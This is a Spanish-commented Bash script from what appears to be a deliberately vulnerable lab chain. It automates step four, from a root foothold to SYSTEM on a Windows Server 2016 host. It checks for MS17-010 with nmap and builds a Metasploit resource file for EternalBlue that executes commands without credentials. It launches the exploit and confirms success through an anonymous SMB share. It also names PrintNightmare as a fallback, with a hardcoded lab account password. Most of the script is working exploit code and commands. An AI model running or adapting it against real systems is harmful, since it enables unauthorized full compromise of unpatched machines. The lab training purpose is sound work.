#!/usr/bin/env bash
# ============================================================================
#  lab/chain/04-m3-to-m4.sh — salto 4: M3 (root) → M4 (SYSTEM)
# ----------------------------------------------------------------------------
#  Vulnerabilidad: MS17-010 (EternalBlue) sobre SMBv1 en Windows Server 2016
#  sin parchear. SMB1 está habilitado a propósito en el instalador de M4.
#  El exploit no usa credenciales: obtiene SYSTEM directo.
#
#  Fallback documentado: PrintNightmare (CVE-2021-34527) con la cuenta
#  limitada `soporte` si el build de M4 ya trae MS17-010.
#
#  Uso:
#    bash lab/chain/04-m3-to-m4.sh            # imprime y verifica
#    bash lab/chain/04-m3-to-m4.sh --run      # lanza Metasploit
# ============================================================================

set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_LOG
. "$HERE/../common/lib.sh"
LAB_ROLE=chain

RUN=0
WORK="${LAB_WORK:-${HOME:-/tmp}/lab-work}"
LHOST="${LHOST:-$M6}"
SHARE="${M4_SHARE:-Transfer}"
MARKER="PWNED-M4.txt"

while (($#)); do
  case "$1" in
    --run) RUN=1; shift ;;
    -h|--help) echo "Uso: $0 [--run]"; exit 0 ;;
    *) die "opción desconocida: $1" ;;
  esac
done

lab_banner
step "salto 4 · M3 (${M3}, root) → M4 (${M4}, SYSTEM)"
cat <<EOF
Vulnerabilidad: MS17-010 / EternalBlue (SMBv1, CVE-2017-0144).

  nmap -Pn -p445 --script smb-vuln-ms17-010 $M4
  msfconsole -q -r $WORK/ms17.rc

  # el payload escribe el marcador en el share (Everyone), sin credenciales:
  smbclient //$M4/$SHARE -N -c 'get $MARKER'

Fallback si el build ya trae el parche:
  PrintNightmare (CVE-2021-34527) con la cuenta limitada soporte/Soporte2026!
EOF

step "verificación (nmap)"
if command -v nmap >/dev/null 2>&1; then
  nmap -Pn -p445 --script smb-vuln-ms17-010 "$M4" || warn "nmap falló"
else
  warn "sin nmap; se omite la verificación"
fi

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se lanza el exploit. Para atacar: --run\n' >&2
  exit 0
fi

command -v msfconsole >/dev/null 2>&1 || die "falta msfconsole (paquete metasploit-framework)"
mkdir -p "$WORK"

step "recurso de Metasploit"
cat > "$WORK/ms17.rc" <<EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $M4
set RPORT 445
set PAYLOAD windows/x64/exec
set CMD cmd /c "whoami > C:\\\\$SHARE\\\\$MARKER & hostname >> C:\\\\$SHARE\\\\$MARKER & date /t >> C:\\\\$SHARE\\\\$MARKER"
set ExitOnSession false
exploit -z
sleep 25
exit
EOF
ok "recurso: $WORK/ms17.rc"

step "lanzando EternalBlue"
msfconsole -q -r "$WORK/ms17.rc" || warn "msfconsole terminó con error"

step "leyendo el marcador por SMB (sin credenciales)"
if command -v smbclient >/dev/null 2>&1; then
  rm -f "$WORK/$MARKER"
  smbclient "//$M4/$SHARE" -N -c "get $MARKER $WORK/$MARKER" >/dev/null 2>&1 || true
  if [[ -s "$WORK/$MARKER" ]]; then
    cat "$WORK/$MARKER"
    grep -qi 'system' "$WORK/$MARKER" \
      && ok "SYSTEM en M4 por MS17-010 (sin credenciales)" \
      || warn "marcador leído, pero no dice SYSTEM"
  else
    warn "sin marcador: puede que el build ya tenga MS17-010"
    warn "fallback: PrintNightmare con soporte/Soporte2026! (ver README)"
  fi
else
  warn "sin smbclient; revisar C:\\\\$SHARE\\\\$MARKER por WinRM o consola"
fi
